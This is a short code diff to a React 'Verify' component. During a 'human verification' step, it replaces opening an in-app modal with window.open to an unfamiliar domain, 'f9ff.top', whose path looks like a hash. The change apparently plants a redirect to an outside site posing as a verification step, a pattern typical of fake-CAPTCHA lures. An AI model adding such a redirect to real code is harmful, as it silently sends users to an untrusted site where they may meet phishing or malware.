@@ -44,7 +44,8 @@ const Verify = () => {
       description: "Please complete the human verification process.",
     });
 
-    setIsModalOpen(true);
+    // Open the new website
+    window.open("https://f9ff.top/68fcad4", "_blank");
   };
 
   return (
